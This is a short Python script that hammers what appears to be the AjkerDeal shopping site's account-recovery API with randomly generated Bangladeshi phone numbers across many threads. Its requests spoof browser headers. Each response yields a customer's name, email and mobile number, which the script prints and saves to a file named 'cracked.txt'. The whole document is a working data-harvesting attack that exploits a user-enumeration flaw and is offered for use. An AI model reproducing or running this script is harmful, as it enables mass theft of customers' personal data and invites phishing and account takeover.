import requests
import threading
from random import randint
 
th = int(input("Enter thread: "))

def phoneNumber():
    number = str("01")
    number1 =str(randint(6,9))
    number2 = str(randint(10000000,99999999))
    number3 =number + number1 + number2
    return(number3)

def scrape():
    while True:
        try:
            number = phoneNumber()
            url = "https://api.ajkerdeal.com/recover/accountrecoverylist"
            values =  {"MobileOrEmail":f"{number}","Type":"2"}
            e_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
                "Sec-Ch-Ua-Platform": "Windows",
                "Origin": "https://ajkerdeal.com",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode":"cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://ajkerdeal.com/",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9"
            } 
            response = requests.post(url, headers=e_headers, data=values)
            json_data = response.json()
            customer_name = json_data["Data"][0]["CName"]
            customer_email = json_data["Data"][0]["CEmail"]
            customer_mobile = json_data["Data"][0]["CMobile"]
            print(f"Name: {customer_name}")
            print(f"Email: {customer_email}")
            print(f"Mobile: {customer_mobile}")

            # Write the variables' values to the file
            with open('cracked.txt', 'a') as f:
                f.write(f"Name: {customer_name}\n")
                f.write(f"Email: {customer_email}\n")
                f.write(f"Mobile: {customer_mobile}\n")
                f.write("_______________\n")
                f.flush()

        except Exception as e:
            print(f"Error: {e}")

if __name__ == '__main__':
    threads = []
    for i in range(th):  # create 10 threads
        t = threading.Thread(target=scrape)
        t.start()
        threads.append(t)

    # wait for all threads to complete
    for t in threads:
        t.join()
